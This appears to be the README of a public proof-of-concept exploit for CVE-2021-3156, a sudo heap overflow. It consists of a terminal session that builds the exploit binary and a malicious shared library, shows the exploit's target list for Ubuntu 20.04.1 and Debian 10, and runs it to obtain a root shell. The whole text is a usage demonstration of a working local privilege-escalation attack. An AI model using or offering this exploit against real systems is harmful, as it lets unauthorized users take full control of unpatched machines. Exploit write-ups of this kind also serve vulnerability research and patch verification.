# CVE-2021-3156
xchg@ubuntu:~/Desktop/CVE-2021-3156$ make
rm -rf libnss_X
mkdir libnss_X
gcc -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
xchg@ubuntu:~/Desktop/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    1) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

xchg@ubuntu:~/Desktop/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: 'Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31'
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),1000(xchg)
# 
